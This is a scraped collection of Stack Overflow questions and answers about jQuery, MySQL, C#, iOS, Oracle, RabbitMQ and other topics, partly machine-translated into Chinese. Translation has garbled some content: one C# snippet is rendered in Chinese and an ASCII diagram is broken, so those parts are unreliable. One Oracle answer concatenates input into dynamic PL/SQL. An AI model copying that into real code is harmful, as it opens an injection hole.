        positions.push(parseInt($(this).offset()['top'], 10));
    });

    for( i = 0; i < positions.length; i++ ) {
        if( direction == 'next' && positions[i] > here ) { 
            scroll = collection.get(i);
            break;
        }
        if( direction == 'prev' && i > 0 && positions[i] >= here ) { 
            scroll = collection.get(i-1); 
            break;
        }
    }

    if(scroll) {
        $.scrollTo( scroll, { duration: duration, easing: easing });
    }

    return false;
}

$("a#prev, a#next").click(function() {
    return scroll($(this).prop( 'id' ));
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T12:39:05.440

当我将 jQuery 版本从 1.8.2 降级到 1.6.2 时，这个问题得到了解决

# mysql - MySQL break out group clause from subquery

> ID：13491477
> 
> 赞同：0
> 
> 时间：2012-11-21T10:42:01.793
> 
> 标签：mysql, sql

Here is my query

```
SELECT 
    COALESCE(js.name,'Lead saknas'),
    count(j.id)
FROM 
    jobs j
LEFT JOIN
    job_sources js
    ON j.job_source=js.id
LEFT JOIN 
    (SELECT 
        * 
    FROM 
        quotes 
    GROUP BY 
        job_id) q 
    ON j.id=q.job_id
GROUP BY
    j.job_source 
```

The problem is that it's allowed for each job to have more than one quote. Because of that i group the quotes by job_id. Now sure, this works. But i don't like the solution with a subquery. How can i break out the group clause from the subquery to the main query? I have tried to add q.job_id to the main group clause, both before and after the existing one but don't get the same results.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T15:24:52.207

You are looking for a simple `group by`, I think:

```
SELECT COALESCE(js.name,'Lead saknas'), count(j.id)
FROM jobs j LEFT JOIN
     job_sources js
     ON j.job_source=js.id
GROUP BY COALESCE(js.name,'Lead saknas') 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T11:19:03.573

子查询中的 GROUP BY 将给定 job_id 的所有结果从引号限制为 1（如果您只执行 'SELECT *'，MySQL 将只为每个不同的分组返回 1 个结果，即使有多个行具有该分组），所以您将作业加入到 job_sources 到一个表中，每个 job_id 的引号中只有 1 行。

当 GROUP BY 在主查询中时会发生什么，它将连接 3 个表，然后为每个 job_id 选择其中的 1 个。

由于 MySQL 可以返回多行中的任何 1 行，显然您不能期望结果在每种情况下都相同。

如果您要使用组函数，它应该返回相同的结果（尝试类似 SELECT COUNT(*), GROUP_CONCAT(quote_id) FROM quotes）。

MS SQL 不允许您在执行 GROUP BY 时只执行“SELECT *”（除非您对所有字段进行 GROUP BY，这有点毫无意义），因为它可以为不同的查询返回不同的结果。在 MySQL 中被允许这样做意味着你应该知道你在做什么。

更具体地说，MS SQL 不允许您选择未分组的字段，除非您对它们使用分组函数。

# mysql - Use MySQL to find all External Links which doesn't have “nofollow” Attribute

> ID：13491480
> 
> 赞同：1
> 
> 时间：2012-11-21T10:42:32.163
> 
> 标签：mysql, nofollow

I have a column containing the html for page_content.

With my limited knowledge on SQL I can only find external links or links that have rel="nofollow" in them.

But I need help to find the links which are external and doesn't have the rel="nofollow" attribute and possible add it.

```
Lorem ipsum <a href="http://own-domain.com">dolor</a> sit amet, consectetur adipiscing elit.     
Cras mi lacus, <a href="http://external-domain.com">**mattis**</a> vel rutrum lobortis, pharetra in elit. Praesent consequat <a rel="nofollow" href="http://own-domain.com">condimentum</a> diam ut sodales. 
```

I want to add nofollow attribute to **mattis** , taking care not to add it to own-domain or adding nofollow twice on *condimentum*.

**UPDATE :** Note, that I need to do this on the database of a custom CMS like wordpress. My pages are rendered in PHP. I can modify the source while content load. But I prefer to do this in the database layer to make it permanent.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-02T06:06:39.560

正如@hungerstar 建议的那样，这最好在mysql 之外完成。这可以在内容的生产者或消费者中。如果这是一项临时工作，您也许可以在读取行、更新它们并将它们插入回的辅助脚本中执行此操作

# iphone - Apple 关于通过 Internet 发送敏感数据的规定

> ID：13491482
> 
> 赞同：2
> 
> 时间：2012-11-21T10:42:54.007
> 
> 标签：iphone, objective-c, ios

我目前正在开发一个连接到 Web 服务并以不同方式交换数据的应用程序。我使用 https 连接到服务。

在某些时候，我需要从我的应用程序发送一个信用卡号码。由于我从未做过类似的事情，我不确定我应该做更多的事情来加密 CC 号码，或者它会以这种方式工作（不会被拒绝）。

以前做过这件事的人可以建议吗？

问候，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T11:03:22.233

如果您通过 HTTPS 连接（并且正确操作），CC 号码将被加密，这很好。但是你可能会遇到苹果的麻烦，因为如果你从你的应用程序中付款，你会被敦促使用应用程序内购买。如果您不希望这样，您必须找到一种巧妙的方法将支付流程从您的应用程序中移除，例如让用户在您的网站上创建一个帐户，在那里设置他们的 CC 信息并使用他们的帐户从应用程序连接。

# c# - retrieve value from database and assign it in to string variable C#

> ID：13491484
> 
> 赞同：0
> 
> 时间：2012-11-21T10:42:56.193
> 
> 标签：c#, sql, .net, windows-mobile-6

I want to retrieve value from table. Please guys help me. The thing is I want to get that value and check it with a string value.

this code is not working:

```
SqlCeCommand cmd1 = new SqlCeCommand("SELECT username FROM tmpusername WHERE _id=1", connection);

SqlCeDataReader usernameRdr = null;

usernameRdr = cmd1.ExecuteReader();

while (usernameRdr.Read()){
    string username11 = usernameRdr["username11"].ToString(); 
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:44:37.713

use `username` for accessing column.

```
string username11 = usernameRdr["username"].ToString(); 
```

Your select command is specifying `Select username` and later you are accessing it using `username11`. That is why you are not getting the value, instead you should be getting an exception.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:44:20.633

Change it to be :

```
string username11 = usernameRdr["username"].ToString(); 
```

The data reader indexer takes the name of the column in the SQL result set which is "SELECT **username**..." in your SQL query.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T10:55:14.357

您可能想查看**dataReader**是否首先返回任何行，以防止从数据库返回可能导致[NullReferenceException](http://msdn.microsoft.com/en-us/library/system.nullreferenceexception%28v=vs.80%29.aspx)的空值，因此请使用以下内容；

> > 字符串用户名11=字符串.empty；
> 
> ```
> if (usernameRdr.hasRows)
> {
> while (reader.Read())
> {
> username11=usernameRdr["username"].ToString();
> }
> } 
> ```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T13:21:52.817

```
string username11 = (string)usernameRdr["username"]; 
```

您输入了错误的列名`username11`而不是`username`。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-21T10:53:35.810

用于处理空值更改为，

```
string username11 = Convert.ToString(usernameRdr["username"]); 
```

# javascript - 以编程方式在 UIWebView 中选择文本

> ID：13491485
> 
> 赞同：16
> 
> 时间：2012-11-21T10:43:22.087
> 
> 标签：javascript, iphone, ios, uiwebview

经过2天的研究，我在问这个问题。我已经阅读了 stackoverflow 和 google 中的所有相关问题和答案（包括[这个](https://stackoverflow.com/questions/13275236/custom-uimenucontroller-uiwebview)问题，它非常相似但没有答案），但仍然找不到解决方案。希望这里有人能够提供帮助。

我有一个 UIWebView ，其中加载了一些文本。我想以编程方式选择部分文本，就好像用户长按它一样。

我尝试执行此 javascript 代码作为对点击的响应：

```
function selectEl(x,y)
{
    document.designMode = "on";
    var el = document.elementFromPoint(x, y);
    var range = document.createRange();
    range.selectNodeContents(el);
    var sel = document.getSelection();
    sel.removeAllRanges();
    sel.addRange(range);
    document.designMode = "off";
} 
```

我已经尝试过在函数结束时将 designMode 更改为“off”，也可以不更改。我知道这段代码“选择”了正确的元素，因为如果我执行这个命令

```
document.execCommand("BackColor", false, "#ffffcc"); 
```

它实际上突出显示了我单击的元素，但不会导致选择文本。关于如何实现这一目标的任何想法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T21:58:21.260

这似乎是 Mobile Safari 中的一个错误。当我切换`contentEditable`到 true`touchstart`并将其设置为 false 时，`touchend`它​​可以工作。如果我删除这些行并刷新它*仍然*有效。如果我关闭 Mobile Safari，清除缓存，然后重新打开删除行的文档，它会再次停止工作。

我已经用工作版本更新了下面的代码（尽管为了简单起见，我删除了长按）。

```
<!DOCTYPE html>
<html>
<head>
<script type="text/javascript">

(function() {
    var node,
        range,
        offset,
        clientX,
        clientY;

    document.addEventListener("DOMContentLoaded", function() {
        document.body.addEventListener("touchstart", function(event) {
            var selection = window.getSelection();
            selection.removeAllRanges();

            clientX = event.touches[0].clientX;
            clientY = event.touches[0].clientY;

            range = document.caretRangeFromPoint(clientX, clientY);
            node = range.startContainer;
            offset = range.startOffset;

            document.body.contentEditable = "true";
            event.preventDefault();
        });
        document.body.addEventListener("touchmove", function(event) {
            var selection = window.getSelection(),
                range = document.caretRangeFromPoint(event.touches[0].clientX, event.touches[0].clientY),
                newRange = document.createRange();

            if(clientY < event.touches[0].clientY) {
                newRange.setStart(node, offset);
                newRange.setEnd(range.startContainer, range.startOffset);
            }
            else {
                newRange.setStart(range.startContainer, range.startOffset);
                newRange.setEnd(node, offset);
            }

            selection.removeAllRanges();
            selection.addRange(newRange);

            event.preventDefault();
        });
        document.body.addEventListener("touchend", function(event) {
            document.body.contentEditable = "false";
            event.preventDefault();
        });
    });
})();
</script>
<body>
    Lorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam tempus volutpat mauris sed porta. Phasellus euismod malesuada eleifend. Donec mattis, orci quis scelerisque mattis, turpis sem pulvinar nisi, et sagittis nunc nisi sed nulla. Pellentesque pharetra consequat neque, ultrices mattis mauris auctor id. Aenean tincidunt turpis non odio gravida semper. Praesent feugiat, lorem at lacinia tristique, orci eros tincidunt leo, at adipiscing sapien felis at tellus. Phasellus ac est nec nibh posuere euismod vel vitae neque. Vestibulum mollis adipiscing urna ut tristique. Vivamus purus tortor, venenatis id aliquam nec, elementum et lacus. Praesent elementum purus eget sapien ornare laoreet. Vestibulum ac odio enim.
</body>
</head>
</html> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-30T10:00:21.303

只是一个想法：确保你没有在你的 css 中使用这样的东西：

```
* {
  -webkit-touch-callout: none;
   -webkit-user-select: none;
   user-select: none;
} 
```

这可以防止任何文本选择。

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2012-11-30T14:22:53.853

我遇到了这个：

```
hitElem.style.backgroundColor = "highlight";
hitElem.style.color = "highlighttext"; 
```

或者， [这个网站](http://www.seabreezecomputers.com/tips/find.htm)已经写了一些可怕的脚本，但它可以帮助你:) 它适用于范围。

# objective-c - How to post from iOS App to Facebook and Twitter wall

> ID：13491489
> 
> 赞同：0
> 
> 时间：2012-11-21T10:43:34.580
> 
> 标签：objective-c, ios, xcode, facebook, sharekit

I have succesfully integrated Sharekit in my application.All I want is to post One image with a description of my app to facebook and twitter wall. I am able to get it in twitter but i am facing a problem with facebook.I am getting a page with saying The iOS bundle ID is missing from app's Facebook iOS settings.and i am struck there.the page also says you have already authorised App.press Okay to continue.and that Okay is directing to a blank page.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:48:26.360

您不能使用 ShareKit 在 facebook 上发帖，您可以使用 FBConnect 进行此操作，请查看以下链接

> [github 示例代码](https://github.com/facebook/facebook-ios-sdk)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T13:19:33.953

您需要使用[SLComposeViewController](http://developer.apple.com/library/ios/#documentation/NetworkingInternet/Reference/SLComposeViewController_Class/Reference/Reference.html)。[查看本教程：如何在 iOS6 中使用内置的 Facebook/Twitter API。](http://soulwithmobiletechnology.blogspot.ca/2012/07/tutorial-how-to-use-inbuilt.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T11:05:27.843

您需要在 developer.facebook.com 重新注册您的应用程序，然后，当您生成 appId 后，在 shareKit 设置文件中键入它

# facebook - QWebView doesn't perform redirection when loading Facebook dialog

> ID：13491490
> 
> 赞同：1
> 
> 时间：2012-11-21T10:43:36.890
> 
> 标签：facebook, qt, qwebview

I have a sort of Facebook client written with a help of Qt. It uses QWebView to access Facebook feed dialog. Facebook api redirects to the login page and after authorization allows to post a message.

The problem is it can be done correctly only the first time I use it in my app. The next time QWebView only loads html with redirect scripts and do nothing (but the first time it yields loading of the login page).

Does anyone know what kind of problem is it?

update: It appears any javascript content won't work, not only redirect scripts.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-02T08:48:04.803

像这样启用Javascript吗？

QWebSettings *settings = QWebSettings::globalSettings(); 设置->setAttribute(QWebSettings::JavascriptEnabled, true);

# symfony - 从 symfony2 父实体中加载字段结果

> ID：13491491
> 
> 赞同：0
> 
> 时间：2012-11-21T10:43:36.030
> 
> 标签：symfony, doctrine-orm, twig

有谁知道将连接字段的结果加载到父实体中的方法？

我需要这个的一个例子是在我的文章实体中。一篇文章可以有多个翻译，但应根据所选语言环境加载一个。

文本和标题字段是从文章翻译包中加载的，它们不存在于我的文章实体中。

加载所有字段不是问题，在我的文章Repository 中是以下代码：

```
....
$oQueryBuilder->select('a, tr');
$oQueryBuilder->from('CommonArticleBundle:Article', 'a');
$oQueryBuilder->andWhere('a.active = 1');

$oQueryBuilder->leftJoin('a.translations', 'tr');
$oQueryBuilder->andWhere('tr.language = 2');
......... 
```

返回的查询是包含所有文章字段和翻译字段的单行。

是否可以访问树枝中的翻译字段，例如：{{ article.text }}？

我尝试添加私人 $title; 到我的文章实体，但 var_dump 显示值为 null。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T14:11:28.390

你有没有尝试过：

```
$oQueryBuilder->select(array('a.id', 'tr.title', 'tr.text'));
$articles = $oQueryBuilder->getQuery()->getArrayResult(); 
```

然后阅读第一篇文章字段，例如：

```
$article[0]['title']; 
```

如果您想要子实体，您也可以这样做：

```
$oQueryBuilder->select(array('a.id', 'tr.title', 'tr.text', 's'));
$oQueryBuilder->leftJoin('a.sessions', 's'); 
```

进而：

```
$sessions = $article[0]['sessions'];
foreach ($sessions as $s)
{
    $text = $s['text'];
} 
```

# java - 在 Struts 2 中绑定后更改参数

> ID：13491495
> 
> 赞同：4
> 
> 时间：2012-11-21T10:43:54.673
> 
> 标签：java, data-binding, struts2, interceptor, interceptorstack

我有一个从用户（例如日期）接收一些参数的操作。此操作会生成许多不同的报告，因此它有许多不同的方法。我需要在每种方法之前*调整*这些参数（将时间设置为午夜）。该`prepare`方法在参数绑定之前执行。是否有任何其他拦截器或任何其他约定允许我这样做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T11:19:43.733

另一种方法（如果您现在正在编码则便宜，如果您已经对所有内容都进行了编码则昂贵）是将您必须在单个 Struts2 Action 中执行的每个操作模块化。

然后，您将拥有类似 an 的内容，其中包含使用而不是`BaseReportAction`共享的所有常见属性和方法，对方法中的参数和常见操作进行调整；`protected``private``execute()`

每个扩展 BaseReportAction 的报告都有一个 Action，比方说

> ExcelReportAction、PdfReportAction 等...

或者

> MinimalReportAction、CompleteReportAction 等...

或者也

> DailyReportAction、MonthlyReportAction 等...

唯一的要求是`super.execute();`作为每个子 Action`execute()`方法的第一条语句。

通过这种方式，您可以利用继承，拥有许多更小、更干净（最终打包成几个子包）的 Action，而不是一个包含许多方法的巨大 Action。

少数报告使用的所有实用程序方法仅适用于这些报告，而不适用于所有其他报告（例如 PDF 和 XLS 的东西）......

对于不同的操作，您也可以从 XML 验证中受益（也许一个报告需要来自另一个报告的不同输入）。

最后，您的调整代码将是线程安全的（动作是线程安全的，拦截器不是）。

但如前所述，这是一种更适合预编码阶段的实现选择（即使重构并不难，根据 Web 应用程序的大小......）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T10:47:06.673

使用`<interceptor-ref name="paramsPrepareParamsStack"/>`

> ```
> <!-- An example of the params-prepare-params trick. This stack
>     is exactly the same as the defaultStack, except that it
>     includes one extra interceptor before the prepare interceptor:
>     the params interceptor.
> 
>     This is useful for when you wish to apply parameters directly
>      to an object that you wish to load externally (such as a DAO
>      or database or service layer), but can't load that object
>      until at least the ID parameter has been loaded. By loading
>      the parameters twice, you can retrieve the object in the
>      prepare() method, allowing the second params interceptor to
>      apply the values on the object. --> 
> ```

如果您使用的是*Convention 插件*，请将其应用于操作

```
@Action(value="action1", interceptorRefs=@InterceptorRef("paramsPrepareParamsStack")) 
```

# wait - 如何让期望脚本等到shell脚本完成

> ID：13491498
> 
> 赞同：3
> 
> 时间：2012-11-21T10:44:00.370
> 
> 标签：wait, expect

我编写了一个期望脚本，它会自动从普通用户切换到 oracle 用户，并触发一个用于进行数据库备份的脚本。现在的问题是我希望脚本等到另一个shell脚本被执行，即直到数据库备份成功。我试过谷歌搜索并发现了一些东西：1）在期望脚本中使用等待。但我找不到如何在期望脚本中使用等待命令来等待其他脚本被执行。2）在期望脚本中使用系统命令来调用另一个shell脚本，但我找不到如何使用它的确切语法。这似乎也是交流编程命令（如果是这样，那么我不能使用它）。

请提出一些方法让期望脚本等到子进程完成。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T14:57:55.477

在期望中，你会做类似的事情

```
set timeout -1
send "su - oracle\r"
expect $oracle_shell_prompt
send "backup_script.sh\r"
expect $oracle_shell_prompt
puts "backup script done"
send "exit\r"
expect $normal_user_prompt 
```

# sql - 从 SQL Server 2008 R2 中的联接表中删除一行

> ID：13491504
> 
> 赞同：1
> 
> 时间：2012-11-21T10:44:29.643
> 
> 标签：sql, sql-server, tsql

我有两张桌子：

```
CREATE TABLE [Training].[UserTrainingModuleResults](
[UserTrainingModuleResultId] [int] IDENTITY(1,1) NOT NULL,
[TrainingModules_TrainingModuleId] [int] NOT NULL,
[Users_UserId] [int] NOT NULL,
[DateAndTimeStarted] [datetime] NOT NULL,
[DateAndTimeCompleted] [datetime] NULL,
[NumberOfQuestionsAnswered] [smallint] NOT NULL,
[NumberOfQuestionsAnsweredCorrectly] [smallint] NOT NULL,
[TrainingModuleStatuses_TrainingModuleStatusId] [smallint] NOT NULL,
  CONSTRAINT [PK_UserTrainingModuleResults] PRIMARY KEY CLUSTERED 
(
[UserTrainingModuleResultId] ASC
  )WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF,    ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
) ON [PRIMARY] 
```

和

```
CREATE TABLE [History].[ViewTrainingModuleHistory](
[HistoryId] [int] NOT NULL,
[TrainingModules_TrainingModuleId] [int] NOT NULL,
CONSTRAINT [PK_ViewTrainingModuleHistory] PRIMARY KEY CLUSTERED 
(
[HistoryId] ASC
  )WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
 ) ON [PRIMARY] 
```

然后我有一个脚本必须从 ViewTrainingModuleHistory 中删除 TrainingModules_TrainingModuleId = UserTrainingModuleResults.TrainingModules_TrainingModuleId

```
delete from History.TrainingModuleCompletedHistory as tmch  //syntax error here
  left join Training.UserTrainingModuleResults as utmr
on utmr.UserTrainingModuleResultId = tmch.UserTrainingModuleResults_UserTrainingModuleResultId
where utmr.Users_UserId = 446 and tmch.UserTrainingModuleResults_UserTrainingModuleResultId = 110 
```

以上不正确，我在“as”附近出现语法错误，请帮助谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:48:57.107

```
delete tmch  
from History.TrainingModuleCompletedHistory tmch
  left join Training.UserTrainingModuleResults utmr
on utmr.UserTrainingModuleResultId = tmch.UserTrainingModuleResults_UserTrainingModuleResultId
where utmr.Users_UserId = 446 and tmch.UserTrainingModuleResults_UserTrainingModuleResultId = 110 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:48:07.437

别名应该在单词之后[`DELETE`](http://msdn.microsoft.com/en-us/library/aa258847%28v=sql.80%29.aspx)：

```
delete tmch   --- < alias of table to delete records from goes here
from History.TrainingModuleCompletedHistory tmch  
left join Training.UserTrainingModuleResults utmr
  on utmr.UserTrainingModuleResultId = tmch.UserTrainingModuleResults_UserTrainingModuleResultId
where utmr.Users_UserId = 446 
  and tmch.UserTrainingModuleResults_UserTrainingModuleResultId = 110 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T10:48:15.367

```
delete tmch  
from History.TrainingModuleCompletedHistory tmch  
left join Training.UserTrainingModuleResults utmr
on utmr.UserTrainingModuleResultId = tmch.UserTrainingModuleResults_UserTrainingModuleResultId
where utmr.Users_UserId = 446 
and tmch.UserTrainingModuleResults_UserTrainingModuleResultId = 110 
```

# sql - 布尔支持 Oracle SQL

> ID：13491508
> 
> 赞同：8
> 
> 时间：2012-11-21T10:44:45.717
> 
> 标签：sql, oracle, boolean

`bool`Oracle PL/SQL 支持数据类型，而 Oracle SQL 不支持，这一直让我感到沮丧。当您想将 PL/SQL 布尔返回值处理回您的日常 SQL（下面的示例）时，这是众所周知的一大难题。

即使是 ask-Tom 网站也对这种不合适的情况感到厌烦，报告说您应该将布尔列编码为固定值`'Y'/'N' CHAR`列，在如此多的不同层面上，这是一个非常糟糕的逃避答案，我不知道从哪里开始批评它。事实上，这个响应的唯一可取之处是（据我最近发现），许多其他数据库引擎也不支持布尔数据类型。

无论如何-问题...

对于以下问题，我有一个解决方法（尽管混乱而冗长），所以我出于好奇而不是必要而提出这个问题。但是让我感到惊讶的少数几件事之一是聪明的程序员的独创性，所以希望你们中的一个人能想出​​解决以下问题的方法。

在下面的示例中，函数`stock_pkg.is_in_stock()`（这是我的应用程序的固有部分）返回一个 BOOL 值，导致 SQL 无效（请记住，SQL 不支持 BOOL）：

```
SELECT part_no, stock_pkg.is_in_stock(part_no) in_stock
FROM   parts_table 
```

我需要的是找到一种使用上述函数调用来生成格式的有效字符串（varchar）输出的方法：

```
PART_NO IN_STOCK
------- ------------
AA      YES
BB      NO
CC      NO 
```

（你可以用 'yes/no' 代替 'true/false'、'green/red'、'tory/labour' 甚至是数字 1/0，只要输出属于两个不同的类别。）

不幸的是，我无权重写原始函数以返回不同的数据类型。此外，在更大的应用程序中散布着成千上万个这样的函数，因此将它们全部重写是不切实际的。

所以从这个意义上说，解决方案必须是一个“通用”的解决方案（即不特定于这个函数调用）。例如，将函数重写为 是不够的`stock_pkg.is_in_stock_chr()`，因为这意味着必须在我的应用程序中重写所有其他类似的函数。

我已经尝试过：

```
SELECT part_no,
       CASE WHEN stock_pkg.is_in_stock(part_no) THEN 'y' ELSE 'n' END in_stock
FROM   parts_table 
```

甚至我自己的包装函数：

```
SELECT part_no,
       my_bool_to_str(stock_pkg.is_in_stock(part_no)) in_stock
FROM   parts_table 
```

但是，Oracle SQL 似乎也不允许将布尔值包装在其他功能结构中（至少在 Oracle 10g 中不允许）。

还可以选择在列内编写子选择`in_stock`，但这在极端示例中也可能变得过于复杂，并且还需要针对具体情况。

正如我所说，我希望在某个地方有一个巧妙的解决方案（或者至少是一个我碰巧忽略的非常简单的解决方案）。

谢谢你的时间。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-21T11:17:54.470

您可以像这样编写自己的包装器：

```
CREATE OR REPLACE FUNCTION my_bool_to_str(f varchar2) RETURN VARCHAR2 IS

  b varchar2(2);

BEGIN

  EXECUTE IMMEDIATE 'declare bl boolean; begin bl := ' || f ||
                    '; if bl then :1 := ''y''; else :1 := ''n''; end if; end;'
    using out b;

  return b;

END; 
```

然后你可以这样称呼它：

```
SELECT part_no,
       my_bool_to_str('stock_pkg.is_in_stock('|| part_no|| ')') in_stock
FROM   parts_table 
```

与您的包装器的不同之处在于它获取 varchar 作为输入，而不是 SQL 引擎无法识别的布尔值

# jquery-mobile - 带有滑动过渡的 jQuery Mobile changePage

> ID：13491510
> 
> 赞同：1
> 
> 时间：2012-11-21T10:44:51.303
> 
> 标签：jquery-mobile

在处理“swiperight”事件时，我似乎无法制作“反向”幻灯片效果。因此，下面的代码可以正常工作，但我希望当我进行“向右滑动”时，下一页将从左侧而不是右侧滑入。我确实搜索了文档并将推荐的内容添加[到](http://jquerymobile.com/demos/1.1.1/docs/api/methods.html)`reverse: true`“ swiperight”中：

```
$.mobile.changePage("#page"+nextPage, {transition : "slide", reverse:true}); 
```

但这并不能提供想要的效果。你能指出我在哪里做错了吗？

[我在jsFiddle](http://jsfiddle.net/GYAB7/)上有以下代码：

**html**：

```
<!DOCTYPE html>
<html>
<head>
    <title>jQuery Mobile Application</title>
    <link rel="stylesheet" href="http://code.jquery.com/mobile/1.0a4.1/jquery.mobile-1.0a4.1.min.css" />
    <script src="http://code.jquery.com/jquery-1.5.2.min.js"></script>
    <script src="http://code.jquery.com/mobile/1.0a4.1/jquery.mobile-1.0a4.1.min.js"></script>    
</head>

<body>
    <section id="page1" data-role="page">
        <header data-role="header"><h1>jQuery Mobile</h1></header>

        <div data-role="content" class="content">
            <p>First page!</p>
        </div>
        <footer data-role="footer"><h1>O'Reilly</h1></footer>
    </section>

    <section id="page2" data-role="page">
        <header data-role="header"><h1>jQuery Mobile</h1></header>

        <div data-role="content" class="content">
            <p>Second page!</p>
        </div>
        <footer data-role="footer"r><h1>O'Reilly</h1></footer>
    </section>

    <section id="page3" data-role="page">
        <header data-role="header"><h1>jQuery Mobile</h1></header>

        <div data-role="content" class="content">
            <p>Third page!</p>
        </div>
        <footer data-role="footer"><h1>O'Reilly</h1></footer>
    </section>    
</body>
</html>​ 
```

**jQuery** :

```
(function($) {
    var methods = {
        init : function(options) {
            var settings = {
                callback: function() {}
            };

            if ( options ) {
                $.extend( settings, options );
                }

            $(":jqmData(role='page')").each(function() {
                $(this).bind("swiperight", function() {
                    var nextPage = parseInt($(this).attr("id").split("page")[1]) - 1;
                    if (nextPage === 0) 
                        nextPage = 3;

                    $.mobile.changePage("#page"+nextPage, "slide");
                    });                        

                $(this).bind("swipeleft", function() {
                    var nextPage = parseInt($(this).attr("id").split("page")[1]) +1;
                    if (nextPage === 4) 
                        nextPage = 1;

                    $.mobile.changePage("#page"+nextPage, "slide");
                });
            })
        }
        }

    $.fn.initApp = function(method) {
        if ( methods[method] ) {
            return methods[method].apply(this, Array.prototype.slice.call(arguments, 1));
        } 
        else if ( typeof method === 'object' || ! method ) {
            return methods.init.apply( this, arguments );
        } 
        else {
            $.error( 'Method ' + method + ' does not exist' );
        }
    }
    })(jQuery);

$(document).ready(function(){
    $().initApp();
});
​ 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T14:10:41.403

好的，首先您使用的是 jQM 的 Alpha 版本以及您所指的 jQM 1.1.1 的文档。我已经更新了你的 jsfiddle 以使用最新的 jQM 1.2

*   [http://jsfiddle.net/GYAB7/2/](http://jsfiddle.net/GYAB7/2/)

我已经为反向滑动过渡添加了正确的语法

```
$.mobile.changePage("#page"+nextPage, {
        transition: "slide",
        reverse: false
    });
}); 
```

和反向过渡

```
$.mobile.changePage("#page"+nextPage, {
        transition: "slide",
        reverse: true
    });
}); 
```

# java - RabbitMQ：是否保证内部交付（交易所之间）？

> ID：13491517
> 
> 赞同：1
> 
> 时间：2012-11-21T10:45:18.400
> 
> 标签：java, rabbitmq

假设我有单主机 RabbitMQ 服务器和如下设置：

```
                  .-------------。
               .->| EX扇出|
.-----------.--' | “监控” |
| EX扇出| '---------------' .----.
| “普通”|--。.-----------。.->| 第一季度 |
'-----------' '->| EX 直接 |--q1--' '----'
                  | “队列”|--q2--。.----.
                  '-----------' '->| Q2 |
                                        '----'

```

当我发送消息以使用路由键“q1”交换“common”时 - 是否保证消息到达 Q1 队列？我想确保这样的消息不会卡在交换之间或交换和队列之间的某个地方。

# configuration - Zend 框架 2：如何从模型中获取自定义配置？

> ID：13491518
> 
> 赞同：1
> 
> 时间：2012-11-21T10:45:19.350
> 
> 标签：configuration, model, zend-framework2

在我的应用程序中，有自定义配置，我想将它们放入模型中。

我读到了一种方法，但它不能执行：

```
namespace Core\Model;

use Zend\Db\TableGateway\AbstractTableGateway;
use Zend\Db\TableGateway\Feature\FeatureSet;
use Zend\Db\TableGateway\Feature\GlobalAdapterFeature;
use Zend\Db\Sql\Delete,
    Zend\Db\Sql\Insert,
    Zend\Db\Sql\Update,
    Zend\Db\Sql\Select;

use Zend\ServiceManager\ServiceLocatorAwareInterface;
use Zend\ServiceManager\ServiceLocatorInterface;

class BaseModel extends AbstractTableGateway implements ServiceLocatorAwareInterface
{

    protected $serviceLocator;

    public function setServiceLocator(ServiceLocatorInterface $serviceLocator) {
        $this->serviceLocator = $serviceLocator;
    }

    public function getServiceLocator() {
        return $this->serviceLocator;
    }

    public function __construct()
    {
        $this->featureSet = new FeatureSet();
        $this->featureSet->addFeature(new GlobalAdapterFeature());
        $this->initialize();
    }
} 
```

在我规定的模型中

```
$config = $this->getServiceLocator()->get('config'); 
```

或者

```
$config = $this->getServiceLocator(); 
```

但结果=`NULL`

谁能告诉我我做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T21:42:57.847

您必须创建`BaseModel`使用 ServiceManager 扩展的类的实例。如果使用`new`，则必须自己设置 ServiceManager。

# visual-studio - 在 Visual Studio 2012 中仅替换页面的一部分中的文本

> ID：13491519
> 
> 赞同：1
> 
> 时间：2012-11-21T10:45:22.200
> 
> 标签：visual-studio, replace

我只想在 .cs 页面的一个特定段落中替换一个单词。我选择了该段落，但是当我去查找和替换文本时，该文本被取消选择，并且该单词在页面上的任何地方都突出显示，而不仅仅是在该段落中。有没有办法在 VS 中实现我想要的，或者我应该将文本复制到另一个页面/文本编辑器中并在那里进行替换？

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T20:04:40.033

